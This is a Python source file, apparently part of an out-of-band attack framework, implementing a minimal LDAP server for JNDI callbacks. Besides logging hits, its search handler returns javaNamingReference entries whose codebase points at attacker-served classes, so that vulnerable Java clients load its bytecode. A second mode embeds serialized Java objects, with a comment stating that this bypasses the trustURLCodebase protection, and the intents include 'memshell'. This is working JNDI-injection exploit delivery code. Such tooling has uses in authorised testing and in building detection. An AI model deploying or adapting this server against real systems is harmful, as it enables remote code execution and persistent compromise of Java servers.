"""Minimal LDAP server that handles JNDI lookups.

Supports two delivery modes per token:
  - record: return an empty searchResDone; only log the hit
  - rebind: reply with a JavaNamingReference + codebase pointing at the
    sidecar-served class, so the target JNDI client pulls and loads our bytecode

This is intentionally a tiny parser that only implements the BindRequest /
SearchRequest / UnbindRequest subset we need for JNDI callbacks. It is NOT a
general-purpose LDAP server.
"""
from __future__ import annotations

import asyncio
import logging
import struct
from datetime import datetime, timezone
from typing import Optional

from sqlalchemy import select

from ..collector.bus import HitEvent, bus
from ..config import Settings, get_settings
from ..db import session_scope
from ..models import OobToken

log = logging.getLogger(__name__)


def _enc_len(n: int) -> bytes:
    if n < 0x80:
        return bytes([n])
    out = b""
    while n > 0:
        out = bytes([n & 0xFF]) + out
        n >>= 8
    return bytes([0x80 | len(out)]) + out


def _tlv(tag: int, value: bytes) -> bytes:
    return bytes([tag]) + _enc_len(len(value)) + value


def _int(n: int) -> bytes:
    if n == 0:
        body = b"\x00"
    else:
        body = n.to_bytes((n.bit_length() + 8) // 8, "big", signed=True)
    return _tlv(0x02, body)


def _octet(s: str | bytes) -> bytes:
    if isinstance(s, str):
        s = s.encode()
    return _tlv(0x04, s)


def _enumerated(n: int) -> bytes:
    return _tlv(0x0A, bytes([n]))


def _sequence(*parts: bytes) -> bytes:
    return _tlv(0x30, b"".join(parts))


def _set(*parts: bytes) -> bytes:
    return _tlv(0x31, b"".join(parts))


def _parse_len(buf: bytes, off: int) -> tuple[int, int]:
    first = buf[off]
    off += 1
    if first < 0x80:
        return first, off
    n = first & 0x7F
    v = int.from_bytes(buf[off : off + n], "big")
    return v, off + n


def _parse_tlv(buf: bytes, off: int) -> tuple[int, bytes, int]:
    tag = buf[off]
    length, off = _parse_len(buf, off + 1)
    return tag, buf[off : off + length], off + length


def _bind_response(msg_id: int) -> bytes:
    body = _sequence(_enumerated(0), _octet(""), _octet(""))
    return _sequence(_int(msg_id), _tlv(0x61, body[2 + len(_enc_len(len(body) - 2)) :]))


def _bind_response_ok(msg_id: int) -> bytes:
    # BindResponse ::= [APPLICATION 1] SEQUENCE { resultCode, matchedDN, errMsg }
    inner = _enumerated(0) + _octet("") + _octet("")
    app1 = bytes([0x61]) + _enc_len(len(inner)) + inner
    return _sequence(_int(msg_id), app1)


def _search_res_entry(msg_id: int, dn: str, attrs: list[tuple[str, list[str]]]) -> bytes:
    attr_seqs = []
    for name, values in attrs:
        vals = _set(*[_octet(v) for v in values])
        attr_seqs.append(_sequence(_octet(name), vals))
    body = _octet(dn) + _sequence(*attr_seqs)
    app4 = bytes([0x64]) + _enc_len(len(body)) + body
    return _sequence(_int(msg_id), app4)


def _search_res_done(msg_id: int, result_code: int = 0) -> bytes:
    body = _enumerated(result_code) + _octet("") + _octet("")
    app5 = bytes([0x65]) + _enc_len(len(body)) + body
    return _sequence(_int(msg_id), app5)


async def _lookup_token(token: str) -> Optional[OobToken]:
    async with session_scope() as session:
        res = await session.execute(select(OobToken).where(OobToken.token == token))
        return res.scalar_one_or_none()


class LdapProtocol(asyncio.Protocol):
    def __init__(self, settings: Settings) -> None:
        self._settings = settings
        self._buf = b""
        self._peer = ("?", 0)

    def connection_made(self, transport: asyncio.BaseTransport) -> None:
        self.transport = transport  # type: ignore[attr-defined]
        peer = transport.get_extra_info("peername") or ("?", 0)
        self._peer = peer
        log.debug("LDAP connection from %s", peer)

    def data_received(self, data: bytes) -> None:
        self._buf += data
        while self._buf:
            if self._buf[0] != 0x30:
                self._buf = b""
                return
            try:
                length, hdr_end = _parse_len(self._buf, 1)
            except Exception:
                return
            total = hdr_end + length
            if len(self._buf) < total:
                return
            frame = self._buf[:total]
            self._buf = self._buf[total:]
            try:
                self._handle(frame)
            except Exception as e:
                log.warning("LDAP handle error: %s", e)

    def _handle(self, frame: bytes) -> None:
        _, payload, _ = _parse_tlv(frame, 0)
        _, msg_id_bytes, off = _parse_tlv(payload, 0)
        msg_id = int.from_bytes(msg_id_bytes, "big", signed=True)
        tag = payload[off]
        op_payload_tag, op_payload, _ = _parse_tlv(payload, off)
        if op_payload_tag == 0x60:  # bindRequest
            self.transport.write(_bind_response_ok(msg_id))
            return
        if op_payload_tag == 0x42:  # unbindRequest
            self.transport.close()
            return
        if op_payload_tag == 0x63:  # searchRequest
            # baseObject is first octet-string in op_payload
            _, base_dn, _ = _parse_tlv(op_payload, 0)
            dn = base_dn.decode(errors="replace")
            raw = dn.lstrip("/")
            # Path-style DN: /TOKEN/ClassName → take first path segment
            if "/" in raw:
                token = raw.split("/")[0]
            else:
                # LDAP-style DN: cn=TOKEN,dc=... → take first attribute value
                first_part = raw.split(",")[0]
                token = first_part.split("=")[-1] if "=" in first_part else first_part
            asyncio.get_running_loop().create_task(self._respond_search(msg_id, dn, token))
            return
        # unknown op: reply done
        self.transport.write(_search_res_done(msg_id, 2))

    async def _respond_search(self, msg_id: int, dn: str, token: str) -> None:
        import base64
        row = await _lookup_token(token)
        intent = (row.intent if row else "record")
        spec = (row.payload_spec if row else {}) or {}
        class_name = spec.get("class_name") or f"Exp{token[:6]}"
        if row and intent in ("jndi", "memshell", "serialize"):
            attrs = [
                ("javaClassName", [class_name]),
                ("javaCodeBase", [f"{self._settings.http_base}/callback/http/{token}/class/"]),
                ("objectClass", ["javaNamingReference"]),
                ("javaFactory", [class_name]),
            ]
            self.transport.write(_search_res_entry(msg_id, dn, attrs))
        elif row and intent == "jndi_serialize":
            # javaSerializedData mode: embed serialized Java object directly in LDAP response
            # Bypasses com.sun.jndi.ldap.object.trustURLCodebase (JDK >= 8u191)
            serialized_b64 = spec.get("serialized_b64", "")
            if serialized_b64:
                serialized_bytes = base64.b64decode(serialized_b64)
                attrs_raw = [
                    ("javaClassName", [class_name]),
                    ("objectClass", ["javaSerializedObject"]),
                ]
                # Build entry with binary javaSerializedData attribute
                attr_seqs = []
                for name, values in attrs_raw:
                    vals = _set(*[_octet(v) for v in values])
                    attr_seqs.append(_sequence(_octet(name), vals))
                # Add javaSerializedData as binary (bytes, not string)
                ser_vals = _set(_tlv(0x04, serialized_bytes))
                attr_seqs.append(_sequence(_octet("javaSerializedData"), ser_vals))
                body = _octet(dn) + _sequence(*attr_seqs)
                app4 = bytes([0x64]) + _enc_len(len(body)) + body
                entry = _sequence(_int(msg_id), app4)
                self.transport.write(entry)
        self.transport.write(_search_res_done(msg_id, 0))
        await bus.publish(
            HitEvent(
                protocol="ldap",
                token=token if row else None,
                remote_addr=f"{self._peer[0]}:{self._peer[1]}",
                summary=f"LDAP search dn={dn} intent={intent}",
                raw={"dn": dn, "intent": intent, "class_name": class_name, "msg_id": msg_id},
                created_at=datetime.now(timezone.utc),
            )
        )


async def start_ldap_server() -> asyncio.base_events.Server:
    settings = get_settings()
    loop = asyncio.get_running_loop()
    server = await loop.create_server(
        lambda: LdapProtocol(settings),
        host=settings.broker_host,
        port=settings.ldap_port,
    )
    log.info("LDAP listener on %s:%d", settings.broker_host, settings.ldap_port)
    return server
